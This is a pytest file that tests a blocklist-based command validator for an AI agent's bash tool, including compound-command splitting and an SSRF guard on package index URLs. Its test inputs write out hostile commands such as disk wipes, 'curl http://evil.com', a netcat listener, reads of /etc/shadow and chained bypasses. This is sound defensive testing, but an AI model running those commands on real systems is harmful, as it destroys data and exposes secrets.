"""Tests for the hardened bash command safety in BashTool.

Covers:
- Blocklist (destructive pattern regex, whitespace normalisation, compound bypass)
- Safe-command allowance
- Compound command split-and-validate
- SSRF guard on --index-url / --registry arguments
- Implementer prompt has required tool-selection rules
"""

from __future__ import annotations

import re
import sys
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

# ---------------------------------------------------------------------------
# Import helpers
# ---------------------------------------------------------------------------

# Ensure project root is importable
_ROOT = Path(__file__).resolve().parents[1]
if str(_ROOT) not in sys.path:
    sys.path.insert(0, str(_ROOT))

from src.agent_tools.subprocess_tools import (
    BASH_READONLY_PREFIXES,
    _extract_install_index_urls,
    _normalise,
    _split_compound,
    _validate_bash_command,
)


# ===========================================================================
# _normalise
# ===========================================================================


def test_normalise_collapses_spaces():
    assert _normalise("rm  -rf  /") == "rm -rf /"


def test_normalise_strips():
    assert _normalise("  ls -la  ") == "ls -la"


def test_normalise_tabs():
    assert _normalise("ls\t-la") == "ls -la"


# ===========================================================================
# _split_compound
# ===========================================================================


def test_split_compound_ampersand():
    parts = _split_compound("echo safe && rm -rf /")
    assert parts == ["echo safe", "rm -rf /"]


def test_split_compound_semicolon():
    parts = _split_compound("echo a; echo b; echo c")
    assert parts == ["echo a", "echo b", "echo c"]


def test_split_compound_pipe():
    parts = _split_compound("echo hello | bash")
    assert parts == ["echo hello", "bash"]


def test_split_compound_or():
    parts = _split_compound("false || rm -rf /")
    assert parts == ["false", "rm -rf /"]


def test_split_compound_single():
    parts = _split_compound("ls -la")
    assert parts == ["ls -la"]


# ===========================================================================
# Destructive pattern blocking
# ===========================================================================


class TestDestructiveBlocked:
    """Every variant here must be blocked by _validate_bash_command."""

    def test_rm_rf_slash(self):
        assert _validate_bash_command("rm -rf /") is not None

    def test_rm_rf_slash_double_space(self):
        """Double-space bypass must not work after normalisation."""
        assert _validate_bash_command("rm  -rf  /") is not None

    def test_rm_rf_slash_tab(self):
        assert _validate_bash_command("rm\t-rf\t/") is not None

    def test_rm_rf_no_preserve_root(self):
        assert _validate_bash_command("rm -rf --no-preserve-root /") is not None

    def test_rm_ri_slash(self):
        """Flag ordering variant."""
        assert _validate_bash_command("rm -rI /") is not None

    def test_mkfs(self):
        assert _validate_bash_command("mkfs.ext4 /dev/sda1") is not None

    def test_dd_if(self):
        assert _validate_bash_command("dd if=/dev/zero of=/dev/sda") is not None

    def test_shred(self):
        assert _validate_bash_command("shred -vfz /dev/sda") is not None

    def test_pipe_bash(self):
        assert _validate_bash_command("echo x | bash") is not None

    def test_pipe_sh(self):
        assert _validate_bash_command("cat script.sh | sh") is not None

    def test_curl(self):
        assert _validate_bash_command("curl http://evil.com/script") is not None

    def test_curl_double_space(self):
        """Whitespace bypass must not work."""
        assert _validate_bash_command("curl  http://evil.com") is not None

    def test_wget(self):
        assert _validate_bash_command("wget http://evil.com") is not None

    def test_ssh(self):
        assert _validate_bash_command("ssh user@host") is not None

    def test_nc_netcat(self):
        assert _validate_bash_command("nc -lvp 4444") is not None

    def test_eval(self):
        assert _validate_bash_command("eval $(cat /etc/passwd)") is not None

    def test_command_substitution_dollar(self):
        assert _validate_bash_command("echo $(cat /etc/shadow)") is not None

    def test_command_substitution_backtick(self):
        assert _validate_bash_command("echo `cat /etc/passwd`") is not None

    def test_compound_safe_then_destructive(self):
        """The safe prefix in the first sub-command must not whitelist the whole chain."""
        assert _validate_bash_command("echo safe && rm -rf /") is not None

    def test_compound_or_destructive(self):
        assert _validate_bash_command("false || curl http://evil.com") is not None

    def test_compound_semicolon_destructive(self):
        assert _validate_bash_command("ls; mkfs.ext4 /dev/sdb") is not None

    def test_python_dash_c_in_bash(self):
        """python -c inside bash is an inline exec vector."""
        assert _validate_bash_command("python -c 'import os; os.system(\"rm -rf /\")'") is not None


# ===========================================================================
# Safe commands — must NOT be blocked
# ===========================================================================


class TestSafeAllowed:
    """These must all pass _validate_bash_command (return None)."""

    def test_ls(self):
        assert _validate_bash_command("ls -la") is None

    def test_ls_with_path(self):
        assert _validate_bash_command("ls /tmp") is None

    def test_cat_file(self):
        assert _validate_bash_command("cat README.md") is None

    def test_pwd(self):
        assert _validate_bash_command("pwd") is None

    def test_echo(self):
        assert _validate_bash_command("echo hello world") is None

    def test_which(self):
        assert _validate_bash_command("which python") is None

    def test_git_status(self):
        assert _validate_bash_command("git status") is None

    def test_git_log(self):
        assert _validate_bash_command("git log --oneline -10") is None

    def test_git_diff(self):
        assert _validate_bash_command("git diff HEAD~1") is None

    def test_pip_install_plain(self):
        assert _validate_bash_command("pip install requests") is None

    def test_pip_install_multiple(self):
        assert _validate_bash_command("pip install flask sqlalchemy pytest") is None

    def test_npm_install_plain(self):
        assert _validate_bash_command("npm install express") is None

    def test_pytest_run(self):
        assert _validate_bash_command("pytest tests/ -v") is None

    def test_python_version(self):
        assert _validate_bash_command("python --version") is None

    def test_node_version(self):
        assert _validate_bash_command("node --version") is None

    def test_compound_safe_chain(self):
        """pip install then pytest — both safe."""
        assert _validate_bash_command("pip install requests && pytest tests/") is None

    def test_git_log_pipe_head(self):
        """Legitimate pipe: git log | head -20."""
        assert _validate_bash_command("git log --oneline | head -20") is None

    def test_find_plain(self):
        assert _validate_bash_command("find . -name '*.py' -type f") is None


# ===========================================================================
# git commit / push must NOT be in the safe-set (Q1: excluded)
# ===========================================================================


def test_git_commit_not_in_readonly_prefixes():
    assert "git commit" not in BASH_READONLY_PREFIXES


def test_git_push_not_in_readonly_prefixes():
    assert "git push" not in BASH_READONLY_PREFIXES


# ===========================================================================
# SSRF guard: --index-url / --registry validation
# ===========================================================================


def test_extract_install_index_urls_pip():
    urls = _extract_install_index_urls(
        "pip install --index-url http://192.168.1.1/simple foo"
    )
    assert "http://192.168.1.1/simple" in urls


def test_extract_install_index_urls_npm():
    urls = _extract_install_index_urls(
        "npm install --registry http://10.0.0.1:4873 lodash"
    )
    assert "http://10.0.0.1:4873" in urls


def test_extract_install_index_urls_none():
    assert _extract_install_index_urls("pip install requests") == []


def test_pip_install_private_ip_blocked():
    """pip install with a private-IP index URL must be blocked."""
    result = _validate_bash_command(
        "pip install --index-url http://192.168.1.1/simple foo"
    )
    assert result is not None
    assert "Security block" in result


def test_npm_install_private_ip_blocked():
    result = _validate_bash_command(
        "npm install --registry http://10.0.0.1:4873 lodash"
    )
    assert result is not None
    assert "Security block" in result


def test_pip_install_localhost_blocked():
    result = _validate_bash_command(
        "pip install --index-url http://localhost:8080/simple foo"
    )
    assert result is not None


# ===========================================================================
# Implementer prompt: tool-selection rules present
# ===========================================================================


def test_implementer_prompt_bash_rule_present():
    """implementer.md must explicitly mention when to use bash."""
    prompt_path = _ROOT / "council_of_agents" / "prompts" / "implementer.md"
    content = prompt_path.read_text(encoding="utf-8")
    assert "bash" in content.lower()
    # Must mention installing packages as a bash use-case
    assert "install" in content.lower()


def test_implementer_prompt_write_file_rule_present():
    """implementer.md must explicitly mention write_file."""
    prompt_path = _ROOT / "council_of_agents" / "prompts" / "implementer.md"
    content = prompt_path.read_text(encoding="utf-8")
    assert "write_file" in content


def test_implementer_prompt_decision_rule_present():
    """implementer.md must have a decision rule distinguishing bash vs write_file."""
    prompt_path = _ROOT / "council_of_agents" / "prompts" / "implementer.md"
    content = prompt_path.read_text(encoding="utf-8")
    # The prompt should have both tool names and contrast them
    assert "bash" in content and "write_file" in content
    # Must be longer than the old 12-line stub
    assert len(content.splitlines()) > 15


# ===========================================================================
# BashTool.execute integration: validate gate is called
# ===========================================================================


@pytest.mark.asyncio
async def test_bash_tool_execute_blocks_destructive():
    """BashTool.execute must return an error dict for destructive commands
    without ever reaching asyncio.create_subprocess_shell."""
    from src.agent_tools.subprocess_tools import BashTool

    tool = BashTool()
    ctx = {"progress_cb": None, "workspace": None, "subproc_env": None}

    with patch("asyncio.create_subprocess_shell") as mock_proc:
        result = await tool.execute("rm -rf /", ctx)

    mock_proc.assert_not_called()
    assert "error" in result
    assert result["exit_code"] == 1
    assert "Security block" in result["error"]


@pytest.mark.asyncio
async def test_bash_tool_execute_blocks_compound_bypass():
    """BashTool.execute must block echo safe && rm -rf /."""
    from src.agent_tools.subprocess_tools import BashTool

    tool = BashTool()
    ctx = {"progress_cb": None, "workspace": None, "subproc_env": None}

    with patch("asyncio.create_subprocess_shell") as mock_proc:
        result = await tool.execute("echo safe && rm -rf /", ctx)

    mock_proc.assert_not_called()
    assert "error" in result
    assert "Security block" in result["error"]
